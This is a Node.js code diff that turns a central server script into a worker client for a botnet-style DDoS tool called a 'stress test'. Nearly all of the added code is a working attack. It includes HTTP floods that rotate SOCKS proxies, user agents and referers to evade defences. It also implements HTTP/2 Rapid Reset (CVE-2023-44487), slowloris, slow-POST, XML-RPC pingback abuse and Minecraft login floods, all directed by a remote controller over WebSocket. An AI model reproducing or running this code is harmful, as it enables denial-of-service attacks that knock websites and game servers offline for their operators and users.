-  workers.forEach(worker => {
-    worker.status = 'active';
-    worker.stats = { sent: 0, success: 0, failed: 0 };
-    worker.ws.send(JSON.stringify({ type: 'start', config: config }));
-  });
-  
-  broadcastToAdmins({ type: 'test_started', workers: workers.length, config: config });
-  
-  setTimeout(() => {
-    if (activeTest) {
-      console.log('[!] Attack duration completed - stopping');
-      stopStressTest();
+  while (isRunning && Date.now() < endTime) {
+    // Rotate proxy every 5 requests if enabled
+    if (config.useProxy && requestsSinceRotation >= 5) {
+      currentProxy = rotateProxy();
+      requestsSinceRotation = 0;
+      proxyRequestCount = 0;
     }
-  }, config.duration * 1000);
+    
+    // Rotate user agent every request if enabled
+    if (config.rotateUserAgent) {
+      currentUserAgent = getRandomUserAgent();
+    }
+    
+    if (isMinecraft) {
+      sendMinecraftAttack(config, resolvedIP);
+    } else if (isHTTP2 && http2Supported) {
+      try {
+        await sendHTTP2RapidReset(config);
+      } catch (e) {
+        // Fallback to standard HTTP flood if HTTP/2 fails
+        if (e.code === 'ERR_SSL_BAD_EXTENSION' || e.message.includes('ALPN')) {
+          http2Supported = false;
+          log('⚠ Falling back to standard HTTP flood');
+          sendRequestNoWait(config, resolvedIP);
+        }
+      }
+    } else {
+      sendRequestNoWait(config, resolvedIP);
+    }
+    
+    stats.sent++;
+    requestsSinceRotation++;
+    
+    if (config.delay > 0) {
+      await sleep(config.delay);
+    }
+  }
 }
 
-function stopStressTest() {
-  if (!activeTest) return;
-  
-  console.log('[!] Stopping stress test');
-  activeTest = null;
-  
-  const workers = Array.from(clients.values()).filter(c => c.type === 'worker');
-  
-  const finalStats = workers.map(w => ({ id: w.id, stats: { ...w.stats } }));
-  
-  let totalSent = 0, totalSuccess = 0, totalFailed = 0;
-  finalStats.forEach(w => {
-    totalSent += w.stats.sent || 0;
-    totalSuccess += w.stats.success || 0;
-    totalFailed += w.stats.failed || 0;
-  });
-  
-  console.log('╔════════════════════════════════════════╗');
-  console.log('║       ATTACK SUMMARY REPORT            ║');
-  console.log('╠════════════════════════════════════════╣');
-  console.log(`║  Total Requests: ${totalSent.toString().padStart(20)} ║`);
-  console.log(`║  Successful:     ${totalSuccess.toString().padStart(20)} ║`);
-  console.log(`║  Failed:         ${totalFailed.toString().padStart(20)} ║`);
-  console.log(`║  Success Rate:   ${totalSent > 0 ? ((totalSuccess/totalSent)*100).toFixed(1) : '0'}%`.padEnd(41) + '║');
-  console.log(`║  Workers Used:   ${workers.length.toString().padStart(20)} ║`);
-  console.log('╚════════════════════════════════════════╝');
-  
-  workers.forEach(worker => {
-    worker.status = 'idle';
-    if (worker.ws.readyState === WebSocket.OPEN) {
-      worker.ws.send(JSON.stringify({ type: 'stop' }));
-    }
-  });
-  
-  broadcastToAdmins({ 
-    type: 'test_stopped',
-    finalStats,
-    summary: {
-      totalSent,
-      totalSuccess,
-      totalFailed,
-      successRate: totalSent > 0 ? ((totalSuccess/totalSent)*100).toFixed(1) : 0,
-      workersUsed: workers.length
-    }
-  });
-}
-
-function sendStatus(ws) {
-  const workers = Array.from(clients.values())
-    .filter(c => c.type === 'worker' && c.ws.readyState === WebSocket.OPEN)
-    .map(c => ({ id: c.id, status: c.status, stats: c.stats }));
+async function resolveDNS(hostname) {
+  if (dnsCache.has(hostname)) {
+    return dnsCache.get(hostname);
+  }
   
   try {
-    ws.send(JSON.stringify({ type: 'status', workers: workers, activeTest: activeTest }));
-  } catch (e) {
-    console.error('[!] Failed to send status:', e.message);
+    const addresses = await dns.resolve4(hostname);
+    const ip = addresses[0];
+    dnsCache.set(hostname, ip);
+    log(`✓ DNS resolved: ${hostname} -> ${ip}`);
+    return ip;
+  } catch (error) {
+    return null;
   }
 }
 
-function broadcastToAdmins(data) {
-  clients.forEach(client => {
-    if (client.type === 'admin' && client.ws.readyState === WebSocket.OPEN) {
-      client.ws.send(JSON.stringify(data));
-    }
-  });
+function getRandomUserAgent() {
+  if (userAgents.length === 0) return 'Mozilla/5.0';
+  return userAgents[Math.floor(Math.random() * userAgents.length)];
 }
 
-server.listen(PORT, '0.0.0.0', () => {
-  console.log(`
+function getRandomProxy() {
+  if (proxies.length === 0) return null;
+  
+  // Filter out dead proxies
+  const aliveProxies = proxies.filter((p, idx) => {
+    const key = `${p.host}:${p.port}`;
+    return !deadProxies.has(key);
+  });
+  
+  if (aliveProxies.length === 0) {
+    // All proxies dead, clear the list and retry
+    deadProxies.clear();
+    log('⚠ All proxies failed, resetting dead proxy list');
+    return proxies[Math.floor(Math.random() * proxies.length)];
+  }
+  
+  // Rotate through alive proxies
+  return aliveProxies[Math.floor(Math.random() * aliveProxies.length)];
+}
+
+function rotateProxy() {
+  if (proxies.length === 0) return null;
+  
+  // Get next alive proxy
+  let attempts = 0;
+  while (attempts < proxies.length) {
+    const proxy = proxies[currentProxyIndex];
+    const key = `${proxy.host}:${proxy.port}`;
+    
+    currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
+    
+    if (!deadProxies.has(key)) {
+      return proxy;
+    }
+    attempts++;
+  }
+  
+  // All proxies dead, reset (only log once)
+  const now = Date.now();
+  if (now - lastProxyLogTime > 5000) {
+    log('⚠ All proxies failed, resetting dead proxy list and retrying');
+    lastProxyLogTime = now;
+  }
+  deadProxies.clear();
+  currentProxyIndex = 0;
+  return proxies[0];
+}
+
+function markProxyDead(proxy) {
+  if (!proxy) return;
+  const key = `${proxy.host}:${proxy.port}`;
+  
+  // Only log if this is a NEW dead proxy (not already marked)
+  if (!deadProxies.has(key)) {
+    deadProxies.add(key);
+    const aliveCount = proxies.length - deadProxies.size;
+    
+    // Throttle logging - only log every 2 seconds max
+    const now = Date.now();
+    if (now - lastProxyLogTime > 2000) {
+      log(`❌ Proxy dead: ${key} (${aliveCount} alive / ${proxies.length} total)`);
+      lastProxyLogTime = now;
+    }
+    
+    // If all proxies are dead, always log
+    if (aliveCount === 0) {
+      log(`⚠ All ${proxies.length} proxies are dead!`);
+    }
+  }
+}
+
+function getRandomHeaders(config) {
+  // Rotate user agent if enabled
+  if (config.rotateUserAgent) {
+    currentUserAgent = getRandomUserAgent();
+  }
+  
+  const headers = {
+    'User-Agent': currentUserAgent,
+    'Accept': '*/*',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Connection': 'keep-alive',
+    'Upgrade-Insecure-Requests': '1'
+  };
+  
+  if (config.randomHeaders) {
+    const extraHeaders = {
+      'DNT': '1',
+      'Cache-Control': 'max-age=0',
+      'Sec-Fetch-Dest': 'document',
+      'Sec-Fetch-Mode': 'navigate',
+      'Sec-Fetch-Site': 'none',
+      'Sec-Fetch-User': '?1',
+      'X-Requested-With': 'XMLHttpRequest'
+    };
+    
+    Object.keys(extraHeaders).forEach(key => {
+      if (Math.random() > 0.5) {
+        headers[key] = extraHeaders[key];
+      }
+    });
+  }
+  
+  if (config.randomReferer) {
+    const referers = [
+      'https://www.google.com/',
+      'https://www.facebook.com/',
+      'https://www.twitter.com/',
+      'https://www.reddit.com/',
+      'https://www.youtube.com/',
+      'https://www.bing.com/',
+      'https://www.instagram.com/'
+    ];
+    headers['Referer'] = referers[Math.floor(Math.random() * referers.length)];
+  }
+  
+  if (config.cookieFlood) {
+    const cookies = [];
+    for (let i = 0; i < 10; i++) {
+      cookies.push(`session_${i}=${Math.random().toString(36).substring(7)}`);
+    }
+    headers['Cookie'] = cookies.join('; ');
+  }
+  
+  if (config.rangeHeader) {
+    const start = Math.floor(Math.random() * 1000);
+    headers['Range'] = `bytes=${start}-${start + 50}`;
+  }
+  
+  return headers;
+}
+
+function getAttackPath(config, url) {
+  let path = url.pathname + url.search;
+  
+  if (config.cacheBust) {
+    const separator = url.search ? '&' : '?';
+    path += `${separator}_=${Date.now()}${Math.random()}`;
+  }
+  
+  if (config.randomParams) {
+    const separator = path.includes('?') ? '&' : '?';
+    const randomParams = [
+      `v=${Math.floor(Math.random() * 99999)}`,
+      `t=${Date.now()}`,
+      `r=${Math.random().toString(36).substring(7)}`,
+      `cb=${Math.floor(Math.random() * 999999)}`
+    ];
+    path += separator + randomParams[Math.floor(Math.random() * randomParams.length)];
+  }
+  
+  return path;
+}
+
+function getAttackPayload(config) {
+  const mode = config.attackMode || 'standard';
+  
+  switch(mode) {
+    case 'xmlrpc':
+      return `<?xml version="1.0"?>
+<methodCall>
+  <methodName>pingback.ping</methodName>
+  <params>
+    <param><value><string>${config.target}</string></value></param>
+    <param><value><string>${config.target}</string></value></param>
+  </params>
+</methodCall>`;
+    
+    case 'api-abuse':
+      return JSON.stringify({
+        data: Array(100).fill('x'.repeat(100)).join(''),
+        timestamp: Date.now(),
+        nonce: Math.random().toString(36)
+      });
+    
+    case 'slow-post':
+      return 'data=' + 'A'.repeat(10);
+    
+    default:
+      return config.postData || '';
+  }
+}
+
+// HTTP/2 Rapid Reset Attack (CVE-2023-44487)
+async function sendHTTP2RapidReset(config) {
+  try {
+    const url = new URL(config.target);
+    const sessionKey = `${url.hostname}:${url.port || 443}`;
+    
+    let client = http2Sessions.get(sessionKey);
+    
+    if (!client || client.destroyed || client.closed) {
+      // Create new HTTP/2 connection with proper ALPN
+      client = http2.connect(url.origin, {
+        rejectUnauthorized: false,
+        settings: {
+          enablePush: false
+        }
+      });
+      
+      client.on('error', (err) => {
+        // Check if target doesn't support HTTP/2
+        if (err.code === 'ERR_SSL_BAD_EXTENSION' || err.code === 'ERR_HTTP2_ERROR') {
+          log(`⚠ Target doesn't support HTTP/2, falling back to HTTP/1.1`);
+          http2Sessions.delete(sessionKey);
+          stats.failed++;
+          return;
+        }
+        http2Sessions.delete(sessionKey);
+      });
+      
+      client.on('goaway', () => {
+        http2Sessions.delete(sessionKey);
+      });
+      
+      http2Sessions.set(sessionKey, client);
+      
+      // Wait for connection to be ready
+      await new Promise((resolve, reject) => {
+        const timeout = setTimeout(() => reject(new Error('Connection timeout')), 5000);
+        client.once('connect', () => {
+          clearTimeout(timeout);
+          resolve();
+        });
+        client.once('error', (err) => {
+          clearTimeout(timeout);
+          reject(err);
+        });
+      });
+    }
+    
+    // Create stream and immediately reset it (Rapid Reset)
+    const stream = client.request({
+      ':method': config.method || 'GET',
+      ':path': getAttackPath(config, url),
+      ':scheme': url.protocol.replace(':', ''),
+      ':authority': url.hostname,
+      'user-agent': config.rotateUserAgent ? getRandomUserAgent() : currentUserAgent
+    });
+    
+    // Handle stream errors
+    stream.on('error', (err) => {
+      if (err.code !== 'ERR_HTTP2_STREAM_CANCEL') {
+        stats.failed++;
+      }
+    });
+    
+    // Immediately send RST_STREAM to reset the request (this is the attack!)
+    setImmediate(() => {
+      try {
+        stream.close(http2.constants.NGHTTP2_CANCEL);
+        stats.success++;
+      } catch (e) {
+        stats.failed++;
+      }
+    });
+    
+  } catch (error) {
+    // If HTTP/2 fails completely, log once and stop using it
+    if (error.code === 'ERR_SSL_BAD_EXTENSION' || error.message.includes('ALPN')) {
+      if (!http2Sessions.has('_fallback_warned')) {
+        log('⚠ HTTP/2 not supported by target, use standard attack mode instead');
+        http2Sessions.set('_fallback_warned', true);
+      }
+    }
+    stats.failed++;
+  }
+}
+
+function sendRequestNoWait(config, resolvedIP) {
+  try {
+    const url = new URL(config.target);
+    const protocol = url.protocol === 'https:' ? https : http;
+    const agent = url.protocol === 'https:' ? httpsAgent : httpAgent;
+    const mode = config.attackMode || 'standard';
+    
+    // Use current proxy if enabled
+    const proxy = config.useProxy ? currentProxy : null;
+    
+    const options = {
+      hostname: resolvedIP || url.hostname,
+      port: url.port || (url.protocol === 'https:' ? 443 : 80),
+      path: getAttackPath(config, url),
+      method: config.method,
+      headers: getRandomHeaders(config),
+      timeout: mode === 'slowloris' ? 300000 : 5000,
+      agent: agent
+    };
+    
+    if (resolvedIP) {
+      options.headers['Host'] = url.hostname;
+    }
+    
+    if (mode === 'xmlrpc') {
+      options.method = 'POST';
+      options.headers['Content-Type'] = 'text/xml';
+      options.path = '/xmlrpc.php';
+    }
+    
+    if (mode === 'api-abuse') {
+      options.method = 'POST';
+      options.headers['Content-Type'] = 'application/json';
+    }
+    
+    // Proxy support with error tracking
+    if (proxy && config.useProxy) {
+      const socksOptions = {
+        proxy: {
+          host: proxy.host,
+          port: proxy.port,
+          type: 5
+        },
+        command: 'connect',
+        destination: {
+          host: options.hostname,
+          port: options.port
+        },
+        timeout: 5000
+      };
+      
+      if (proxy.user && proxy.pass) {
+        socksOptions.proxy.userId = proxy.user;
+        socksOptions.proxy.password = proxy.pass;
+      }
+      
+      SocksClient.createConnection(socksOptions).then(info => {
+        options.createConnection = () => info.socket;
+        
+        // Handle socket errors
+        info.socket.on('error', (err) => {
+          if (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNREFUSED') {
+            markProxyDead(proxy);
+          }
+          stats.failed++;
+        });
+        
+        makeRequest(protocol, options, config, mode, proxy);
+      }).catch((err) => {
+        // Proxy connection failed
+        markProxyDead(proxy);
+        stats.failed++;
+      });
+    } else {
+      makeRequest(protocol, options, config, mode, null);
+    }
+    
+  } catch (error) {
+    stats.failed++;
+  }
+}
+
+function makeRequest(protocol, options, config, mode, proxy) {
+  try {
+    const req = protocol.request(options, (res) => {
+      stats.success++;
+      proxyRequestCount++;
+      res.resume();
+    });
+    
+    req.on('error', (err) => {
+      if (proxy && (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNREFUSED')) {
+        markProxyDead(proxy);
+      }
+      stats.failed++;
+    });
+    
+    req.on('timeout', () => {
+      stats.failed++;
+      req.destroy();
+    });
+    
+    if (mode === 'slowloris') {
+      req.write('X-');
+      setTimeout(() => {
+        if (!req.destroyed) {
+          req.write('a: b\r\n');
+        }
+      }, 10000);
+    } else if (mode === 'slow-post') {
+      const payload = getAttackPayload(config);
+      let sent = 0;
+      const interval = setInterval(() => {
+        if (sent < payload.length && !req.destroyed) {
+          req.write(payload.charAt(sent));
+          sent++;
+        } else {
+          clearInterval(interval);
+          req.end();
+        }
+      }, 1000);
+    } else {
+      const payload = getAttackPayload(config);
+      if (payload && (config.method === 'POST' || config.method === 'PUT' || config.method === 'PATCH')) {
+        if (mode === 'xmlrpc') {
+          options.headers['Content-Length'] = Buffer.byteLength(payload);
+        }
+        req.write(payload);
+      }
+      req.end();
+    }
+  } catch (error) {
+    stats.failed++;
+  }
+}
+
+function stopAttack() {
+  if (isRunning) {
+    isRunning = false;
+    reportStats();
+    log('⏹ Attack stopped');
+  }
+}
+
+function reportStats() {
+  if (ws && ws.readyState === WebSocket.OPEN) {
+    ws.send(JSON.stringify({
+      type: 'stats',
+      stats: stats,
+      currentUA: currentUserAgent.substring(0, 50) + '...',
+      currentProxy: currentProxy ? `${currentProxy.host}:${currentProxy.port}` : 'Direct',
+      uaCount: userAgents.length,
+      proxyCount: proxies.length
+    }));
+  }
+}
+
+function updateDisplay() {
+  if (!attackStartTime) return;
+  
+  const elapsed = (Date.now() - attackStartTime) / 1000;
+  const successRate = stats.sent > 0 ? ((stats.success / stats.sent) * 100).toFixed(1) : 0;
+  const rps = elapsed > 0 ? (stats.sent / elapsed).toFixed(0) : 0;
+  
+  // Add proxy status if using proxies
+  let proxyStatus = '';
+  if (proxies.length > 0) {
+    const alive = proxies.length - deadProxies.size;
+    proxyStatus = ` | Proxies: ${alive}/${proxies.length}`;
+  }
+  
+  process.stdout.write(`\r[📊] Sent: ${stats.sent} | Success: ${stats.success} | Failed: ${stats.failed} | Rate: ${successRate}% | RPS: ${rps}${proxyStatus}     `);
+}
+
+function log(message) {
+  const time = new Date().toLocaleTimeString();
+  console.log(`\n[${time}] ${message}`);
+}
+
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+// Minecraft Protocol Functions
+function writeVarInt(value) {
+  const bytes = [];
+  while (true) {
+    if ((value & ~0x7F) === 0) {
+      bytes.push(value);
+      break;
+    }
+    bytes.push((value & 0x7F) | 0x80);
+    value >>>= 7;
+  }
+  return Buffer.from(bytes);
+}
+
+function writeString(str) {
+  const strBuf = Buffer.from(str, 'utf8');
+  const lenBuf = writeVarInt(strBuf.length);
+  return Buffer.concat([lenBuf, strBuf]);
+}
+
+function createHandshakePacket(host, port) {
+  const packetId = Buffer.from([0x00]);
+  const protocolVersion = writeVarInt(754);
+  const serverAddress = writeString(host);
+  const serverPort = Buffer.allocUnsafe(2);
+  serverPort.writeUInt16BE(port, 0);
+  const nextState = writeVarInt(1);
+  
+  const data = Buffer.concat([packetId, protocolVersion, serverAddress, serverPort, nextState]);
+  const length = writeVarInt(data.length);
+  
+  return Buffer.concat([length, data]);
+}
+
+function createStatusRequestPacket() {
+  const packetId = Buffer.from([0x00]);
+  const length = writeVarInt(1);
+  return Buffer.concat([length, packetId]);
+}
+
+function createLoginStartPacket(username) {
+  const packetId = Buffer.from([0x00]);
+  const playerName = writeString(username);
+  const data = Buffer.concat([packetId, playerName]);
+  const length = writeVarInt(data.length);
+  return Buffer.concat([length, data]);
+}
+
+function sendMinecraftAttack(config, resolvedIP) {
+  const mode = config.attackMode;
+  const target = resolvedIP || config.target;
+  const port = config.minecraftPort || 25565;
+  
+  try {
+    const socket = new net.Socket();
+    socket.setTimeout(5000);
+    
+    socket.connect(port, target, () => {
+      switch(mode) {
+        case 'minecraft-handshake':
+          const handshake = createHandshakePacket(config.target, port);
+          socket.write(handshake);
+          socket.destroy();
+          stats.success++;
+          break;
+          
+        case 'minecraft-ping':
+          const handshakeForPing = createHandshakePacket(config.target, port);
+          const statusRequest = createStatusRequestPacket();
+          socket.write(Buffer.concat([handshakeForPing, statusRequest]));
+          socket.destroy();
+          stats.success++;
+          break;
+          
+        case 'minecraft-login':
+          const randomUser = 'Bot_' + Math.random().toString(36).substring(7);
+          const handshakeForLogin = createHandshakePacket(config.target, port);
+          handshakeForLogin[handshakeForLogin.length - 1] = 0x02;
+          const loginStart = createLoginStartPacket(randomUser);
+          socket.write(Buffer.concat([handshakeForLogin, loginStart]));
+          setTimeout(() => socket.destroy(), 10000);
+          stats.success++;
+          break;
+          
+        case 'minecraft-join':
+          const joinUser = 'Player_' + Math.random().toString(36).substring(7);
+          const handshakeForJoin = createHandshakePacket(config.target, port);
+          handshakeForJoin[handshakeForJoin.length - 1] = 0x02;
+          const loginPacket = createLoginStartPacket(joinUser);
+          socket.write(Buffer.concat([handshakeForJoin, loginPacket]));
+          stats.success++;
+          break;
+      }
+    });
+    
+    socket.on('error', () => {
+      stats.failed++;
+      socket.destroy();
+    });
+    
+    socket.on('timeout', () => {
+      stats.failed++;
+      socket.destroy();
+    });
+    
+  } catch (error) {
+    stats.failed++;
+  }
+}
+
+// ASCII Banner
+console.log(`
 ╔════════════════════════════════════════╗
-║   STRESS TEST SERVER RUNNING           ║
+║     STRESS TEST WORKER CLIENT          ║
+║         Node.js Edition                ║
 ╠════════════════════════════════════════╣
-║  Port: ${PORT}                            ║
-║  Admin:  /admin                        ║
-║  Worker: /worker                       ║
+║  Server: ${SERVER_URL.substring(0, 36).padEnd(36)}║
+╠════════════════════════════════════════╣
+║  💡 For Render/HTTPS use wss://       ║
+║  💡 For localhost use ws://           ║
 ╚════════════════════════════════════════╝
-  `);
+`);
+
+connect();
+
+process.on('SIGINT', () => {
+  console.log('\n\n[!] Shutting down worker...');
+  stopAttack();
+  if (ws) ws.close();
+  process.exit(0);
 });
